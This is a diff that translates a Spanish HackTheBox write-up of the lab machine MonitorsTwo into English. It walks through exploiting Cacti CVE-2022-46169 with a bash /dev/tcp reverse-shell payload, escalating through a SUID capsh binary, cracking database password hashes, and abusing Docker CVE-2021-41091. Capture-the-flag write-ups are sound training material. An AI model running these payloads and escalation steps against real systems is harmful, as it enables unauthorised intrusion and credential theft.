@@ -1,30 +1,24 @@
 ---
-description: >-
-  MonitorsTwo es una máquina Linux de dificultad fácil que muestra una variedad
-  de vulnerabilidades y configuraciones incorrectas.
 cover: ../../../../../.gitbook/assets/monitorstwo-htb.jpeg
 coverY: 0
 ---
 
 # MonitorsTwo
 
-## Informacion General
+## General Information
 
-* **IP de la máquina**: 10.10.11.211
-* **Sistema Operativo**: Linux
-* **Dificultad**: Facil
+* **Operative System:** Linux
+* **Difficulty**: Easy
 * **Keywords**:
   * Docker
-  * Contenedores
+  * Containers
   * SUID
   * CVE-2021-41091
   * CVE-2022-46169
 
-
-
 ## User Flag
 
-### Escaneo de puertos
+### Port Scanning
 
 ```
 $ sudo nmap -sC -T5 -Pn 10.10.11.211 
@@ -44,9 +38,9 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
 ```
 
-### Enumeracion del servicio web
+### Web Service Enumeration
 
-El servicio web esta ejecutando Cacti v1.2.22 el cual posee una vulnerabilidad RCE.
+The web service is running Cacti v1.2.22. This specific version of Cacti has a remote code execution (RCE) vulnerability.
 
 ```
 $ curl -s http://10.10.11.211/index.php | grep -o "cactiVersion.*;"
@@ -61,21 +55,21 @@ Cacti v1.2.22 - Remote Command Execution (RCE)                                  
 Shellcodes: No Results
 ```
 
-### Explotando la vulnerabilidad CVE-2022-46169 (Cacti v1.2.22)
+### Exploiting CVE-2022-46169 vulnerability for Cacti v1.2.22
 
-Cacti v1.2.22 posee una vulnerabilidad RCE debido a la falta de saneamiento en el archivo remote\_agent.php en la funcion poll\_for\_data()
+Cacti v1.2.22 has a RCE vulnerability in the file **remote\_agent.php** in the funcion **poll\_for\_data()** that doesn't sanitize input parameters in **poll\_for\_data()** function.&#x20;
 
 ```php
-Codigo extraido de la pagina oficial de Cacti en github. 'https://github.com/Cacti/cacti'
-Estos son los fragmentos de codigos relevantes donde se aprecia la vulnerabilidad.
+/* 
+Code from official Cacti github repo. 'https://github.com/Cacti/cacti'
+Only relevant fragments of code extracted for demonstration.
+*/
 <?php
 
-/* 
- * Una de las principales fallas se encuentra en esta funcion.
- * Esta funcion se encarga de retornar la variable de la solicitud HTTP
- * sin aplicarle ningun filtro, asi por ejemplo cuando se solicita el valor de 
- * poller_id, no se le aplica ningun filtro a pesar de que este pueda contener codigo
- * maligno.
+/*
+ * One of the main failures is located in get_nfilter_request_var() function.
+ * This function simply returns the variable from the HTTP request 
+ * without sanitising or validating input data.
  */
 function get_nfilter_request_var($name, $default = '') {
 	global $_CACTI_REQUEST;
@@ -88,17 +82,18 @@ function get_nfilter_request_var($name, $default = '') {
 	}
 }
 
-// codigo sin corregir
+// Unpatched Code 
 $local_data_ids = get_nfilter_request_var('local_data_ids');
 $host_id        = get_filter_request_var('host_id');
-$poller_id      = get_nfilter_request_var('poller_id'); // en $poller_id se aloja el payload 
+$poller_id      = get_nfilter_request_var('poller_id'); // payload is stored in $poller_id 
 $return         = array();
 if (function_exists('proc_open')) {
     /* 
-     * La funcion proc_open sirve para ejecutar comandos del sistema de forma asincrona, sin embargo
-     * lo importante radica en que como no se le aplicaron filtros ni se realizo un escapeshellargs a la variable poller_id
-     * dicha variable se esta pasando directo sin sanear a la funcion proc_open, por lo que lo unico que tendrian que agregar es 
-     * un payload tipo "1; whoami" para ejecutar codigo
+     * proc_open() function execute asynchronous system commands. 
+     * Since no filtering or sanitising was performed to the poller_id variable, 
+     * this variable is being passed directly to the proc_open() function so the only
+     * thing someone could do to exploit this function, is simply use a payload like
+     * "1; whoami" to execute arbitrary code.
      */
 	$cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);
     $output = fgets($pipes[1], 1024);
@@ -108,31 +103,33 @@ if (function_exists('proc_open')) {
 
 ```
 
-Con la informacion anterior, se puede desarrollar un exploit para ejecutar comandos de forma remota, simplemente se debe encontrar un LOCAL\_DATA\_ID y un HOST\_ID valido realizando un fuzzing a la siguiente ruta:
+To exploit the Cacti vulnerability, we need to find first a valid LOCAL\_DATA\_ID and HOST\_ID. We can do this with a simple fuzzing to the next path:
 
 ```
 /remote_agent.php?action=polldata&local_data_ids[]=$FUZZ$&host_id=$FUZZ$&poller_id=669
 ```
 
-Este proceso se realiza hasta obtener un resultado como el siguiente:
+This fuzzing should be running until we get a response like the next one:
 
 ```
 [{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
 ```
 
-Para automatizar el proceso de fuzzing y envio del payload, hicé un script `cacti_1.2.22_exploit.py` el cuál puede ser revisado en mi repositorio de github (https://github.com/mind2hex/HackTheBox/Machines/Linux/MonitorsTwo).
+To make things easier, i made a script to fuzz and send the payload. The script is `cacti_1.2.22_exploit.py` and can be found in the next github repository:&#x20;
+
+* [https://github.com/mind2hex/HackTheBox/Machines/Linux/MonitorsTwo](https://github.com/mind2hex/HackTheBox/Machines/Linux/MonitorsTwo)
 
 ```bash
-# TERMINAL 1 iniciando el listener
+# TERMINAL 1 starting listener
 nc -lvnp 1234  
 listening on [any] 1234 ...
 
-# TERMINAL 2 ejecutando el script
-python3 cacti_1.2.22_exploit.py http://10.10.11.211/ "bash -c 'exec bash -i &>/dev/tcp/10.10.16.2/1234 <&1'"
+# TERMINAL 2 executing script
+python3 cacti_1.2.22_exploit.py http://10.10.11.211/ "bash -c 'exec bash -i &>/dev/tcp/<YOUR_IP_HERE>/<YOUR_PORT_HERE> <&1'"
 1 6
-[!] Sending payload: 669%3Bbash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/10.10.16.2/1234%20%3C%261%27
+[!] Sending payload: 669%3Bbash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/<YOUR_IP_HERE>/<YOUR_PORT_HERE%20%3C%261%27
 
-# TERMINAL 1 recibiendo la conexion
+# TERMINAL 1 receiving connection
 nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.10.16.2] from (UNKNOWN) [10.10.11.211] 47748
@@ -141,17 +138,17 @@ bash: no job control in this shell
 www-data@50bca5e748b0:/var/www/html$ 
 ```
 
-### Escalación de privilegios en el contenedor
+### Privilege Escalation inside the container
 
-Al momento de obtener una shell, se procedió a cargar el script `linpeas.sh` para la enumeracion local.
+Using `leanpeas.sh` to enumerate the container.
 
 ```bash
-# La shell se esta ejecutando adentro de un contenedor
+# Shell is running inside a container
 ╔══════════╣ Unexpected in root   
 /.dockerenv
 /entrypoint.sh
 
-# el binario capsh nos permite escalar privilegios
+# capsh binary allow us to escalate privileges
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
 strace Not Found
@@ -166,7 +163,7 @@ strace Not Found
 -rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
 ```
 
-La enumeración realizada por `linpeas.sh` indica que la shell se esta ejecutando en un contenedor, ademas de esto tambien existe un binario con SUID el cual nos permite escalar privilegios facilmente.
+From the leanpeas enumeration we can tell that the shell is running inside a contanier and we have a interesting binary file called `capsh`. Using the next command, we can escalate privilege inside the container.
 
 ```bash
 www-data@50bca5e748b0:/sbin$ /sbin/capsh --gid=0 --uid=0 --
@@ -176,9 +173,9 @@ whoami
 root
 ```
 
-### Extracción y crackeo de hashes
+### Extracting and Cracking Hashes
 
-Si leemos el contenido de `/entrypoint.sh` podremos observar unas cuantas instrucciones que se ejecutan en una base de datos llamada `cacti`.
+Reading the content of the `/entrypoint.sh` script, we see some instructions that are being executed in a database called `cacti`.
 
 ```bash
 cat /entrypoint.sh
@@ -201,7 +198,7 @@ fi
 -----------------------
 ```
 
-Podemos utilizar la información anterior para ejecutar comandos en la base de datos de la siguiente forma:
+We can use this information to execute commands inside the database:
 
 ```bash
 mysql --host=db --user=root --password=root cacti -e "show TABLES;"
@@ -226,7 +223,7 @@ guest	43e9a4ab75570f5b
 marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
 ```
 
-Utilizando `hashcat` junto con el diccionario `rockyou.txt` se puede crackear el hash de marcus para iniciar sesion vía SSH.
+Using Hashcat with the `rockyou.txt` dictionary, we can crack the above hashes. After cracking a hash, we can use it to log in via SSH with marcus user:
 
 ```bash
 $ hashcat -a 0 -m 3200 '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C' /usr/share/wordlists/rockyou.txt  --show
@@ -274,9 +271,9 @@ d9947b0eae40f1554a10eda3b4035f08
 
 ## Root Flag
 
-### Enumeración básica
+### Basic Enumeration
 
-Al iniciar sesian via SSH, en el banner, aparece que el usuario marcus tiene correo, por lo tanto se debe inspeccionar el archivo `/var/mail/marcus`.
+The initial login banner tell us that we have mail so we have to inspect `/var/mail/marcus` .
 
 ```
 From: administrator@monitorstwo.htb
@@ -303,11 +300,13 @@ Monitor Two
 Security Team
 ```
 
-En este archivo se expone que en el sistema existen varias vulnerabilidades, sin embargo para no alargar mas el write up, explotaremos la vulnerabilidad CVE-2021-41091.
+This file is a clue of what we should do next. If we read carefully, it tell us that this system had some vulnerabilities. One of the vulnerabilities is CVE-2021-41091.
 
-### Explotando la vulnerabilidad CVE-2021-41091
+### Exploiting CVE-2021-41091 vulnerability
 
-Esta vulnerabilidad en Moby (Docker Engine), le permite a usuarios no autorizados en la maquina ejecutar, leer o modificar archivos adentro del directorio donde se almacenan los archivos de contenedor (`/var/lib/docker/...xyz/merged/`). Esto quiere decir que si un usuario privilegiado adentro del contenedor modifica un binario como SUID, entonces se podria usar para escalar privilegios por otros usuarios de la maquina usando la ruta /var/lib/docker/...xyz/merged/bin. Para lograr esto primero hay que localizar el directorio donde se localizan los archivos del contenedor.
+This Moby (Docker Engine) vulnerability, allow unauthenticated users in the machine, execute, read or modify files inside of the directory where container files are stored. (`/var/lib/docker/...xyz/merged/`). This means that if a user inside the container modify a binary to convert it to a SUID binary. then this SUID binary could be used to escalate privileges by other users using the  `/var/lib/docker/...xyz/merged/bin` path.&#x20;
+
+First, we need to locate the directory where container files are stored.
 
 ```
 marcus@monitorstwo:~$ findmnt
@@ -360,21 +359,20 @@ TARGET                                SOURCE     FSTYPE     OPTIONS
 marcus@monitorstwo:~$ 
 ```
 
-En el resultado anterior se observan dos rutas asi que vamos a crear un archivo de pruebas desde el contenedor
+Two paths are being used to store container files so we're gonna create a testing file from the container.
 
-```
-# CONTENEDOR: creando archivo en el directorio raiz como usuario root (/)
+<pre class="language-bash"><code class="lang-bash"># CONTAINER: creating a file from root directory
 touch /testing
 
-# MARCUS: mostrando el contenido del directorio docker
+# SSH MARCUS: Listing docker container directory 
 marcus@monitorstwo:~$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
 bin   dev            etc   lib    media  opt   root  sbin  sys      tmp  var
-boot  entrypoint.sh  home  lib64  mnt    proc  run   srv   testing  usr
+boot  entrypoint.sh  home  lib64  mnt    proc  run   srv   <a data-footnote-ref href="#user-content-fn-1">testing</a>  usr
 
-# CONTENEDOR: modificando el binario bash para que sea SUID
+# CONTAINER: modifying the binary file to SUID
 chmod u+s /bin/bash
 
-# MARCUS: escalando privilegios usando el binario SUID
+# SSH MARCUS: escalating privileges using the SUID binary.
 marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
 bash-5.1# whoami
 root
@@ -384,12 +382,14 @@ bash-5.1# cat /root/
 bash-5.1# cat /root/root.txt
 1ec867772e1fd89d38388f00a75ee04c
 bash-5.1# 
-```
+</code></pre>
 
-## Referencias
+## References
 
-* [Repositorio de Cacti](https://github.com/Cacti/cacti)
+* [Cacti Repository](https://github.com/Cacti/cacti)
 * [Mind2hex github repo](https://github.com/mind2hex/HackTheBox/tree/master/Machines/Linux/MonitorsTwo)
 * [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 * [CVE-2021-41091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41091)
 * [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)
+
+[^1]: Here is the testing file
